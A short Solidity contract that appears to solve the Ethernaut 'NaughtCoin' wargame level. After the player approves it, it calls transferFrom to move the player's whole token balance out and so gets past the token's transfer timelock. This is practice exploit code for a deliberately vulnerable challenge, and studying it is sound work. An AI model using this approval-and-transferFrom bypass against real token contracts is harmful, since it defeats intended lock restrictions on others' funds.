// SPDX-License-Identifier: MIT
pragma solidity ^0.8;

import "./NaughtCoin.sol";


contract Fiduciary{
    NaughtCoin public NaughtCoinContract;

    constructor(address _NaughtCoinContract){
        NaughtCoinContract = NaughtCoin(_NaughtCoinContract);
    }

    // fiduciary must be approved first before caliing spend
    // call approve function of naughtcoin with address of this contract and balanceof player

    function spend() external {
        address owner = NaughtCoinContract.player();
        uint amount = NaughtCoinContract.balanceOf(owner);
        NaughtCoinContract.transferFrom(owner, address(this), amount);
    }
}
